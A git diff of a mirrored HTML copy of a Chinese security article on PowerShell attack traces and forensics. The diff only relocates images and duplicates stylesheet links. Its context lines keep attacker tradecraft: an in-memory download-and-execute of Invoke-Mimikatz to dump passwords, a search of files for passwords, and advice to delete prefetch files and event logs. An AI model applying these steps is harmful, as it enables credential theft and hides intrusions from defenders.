@@ -3,7 +3,7 @@
 			<head>
 			     <title>powershell各种反弹姿势以及取证（二） - mickey</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/6199">http://drops.wooyun.org/tips/6199</a></h1>
 				
@@ -34,7 +34,7 @@
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502403215229.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015062502403215229.png" alt="enter image description here"></p>
 
 <p>所以每次我们用完powershell，记得<code>del %systemroot%\prefetch\POWERSHELL.EXE-59FC8F3D.pf</code></p>
 
@@ -50,7 +50,7 @@
 
 <p>论文作者主要是说可以用<code>Volatility</code>框架分析<code>wsmprovhost.exe</code>进程，能够在内存空间看到XML格式的信息。比如这里他使用<code>PSSesion</code>远程交互式SHELL执行了<code>“echo "helloword" &gt; c:\text.txt”,</code>然后就可以在<code>wsmprovhost.exe</code>的进程里看到信息，如图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502403373347.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015062502403373347.png" alt="enter image description here"></p>
 
 <p>但是这个方法随着远程会话的中止，也将不再有用，要想成功实现取证，需要攻击者正在操作。所以我感觉这个对我们的威胁不是很大。如果开启了winrm，也有可能在<code>svchost.exe</code>的进程里看到信息。他这里用的是<code>Invoke-Mimikatz</code>做的演示，远程通过下载在内存里执行，DUMP明文密码，不写硬盘，这个渗透技巧实战的时候很有用，命令如下：</p>
 
@@ -60,7 +60,7 @@ Invoke-Command -Computername 192.168.114.133 {iex((New-Object Net.WebClient).Dow
 
 <p>如下是他在svchost.exe进程内存里抓到的信息</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502403429148.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015062502403429148.png" alt="enter image description here"></p>
 
 <h1>0x05 日志：</h1>
 
@@ -90,7 +90,7 @@ Invoke-Command -Computername 192.168.114.133 {iex((New-Object Net.WebClient).Dow
 
 <p><code>EID 32850</code> 会记录<code>remoting</code>客户端连接过来使用的账号信息 <code>EID 32867/32868</code> 里面有可能会看到当<code>Invoke-Command</code>执行命令的时候的细节，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502403478535.jpg" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015062502403478535.jpg" alt="enter image description here"></p>
 
 <p>另外随着Microsoft APPLocker的引用，管理员能够对powershell脚本进行更进一步的验证，比如允许哪个PS脚本运行，哪个不允许，甚至禁止掉计算机上全部PS脚本的执行权限等操作，但是这些对我们来说都有已知的技术能绕过，我下回书再说。<code>AppLocker</code>功能启用后，<code>EID 8005</code> 和<code>EID 8006</code>会记录认证信息的日志。</p>
 
@@ -104,11 +104,11 @@ Get-ChildItem c:\temp -Filter *.txt -Recurse | Select-String password
 
 <p>意思是搜索<code>C:\</code>下所有TXT里包含password的文件，可以在<code>EID 4103</code>里看到返回结果，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502403515070.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015062502403515070.png" alt="enter image description here"></p>
 
 <p>甚至Invoke-Mimikatz执行的结果也会记录，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062502403541243.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015062502403541243.png" alt="enter image description here"></p>
 
 <p>再次提醒我们，该删日志，一定要删，外面应该有能删指定日志的工具了，不过我没见到，有的发我一份。</p>
 
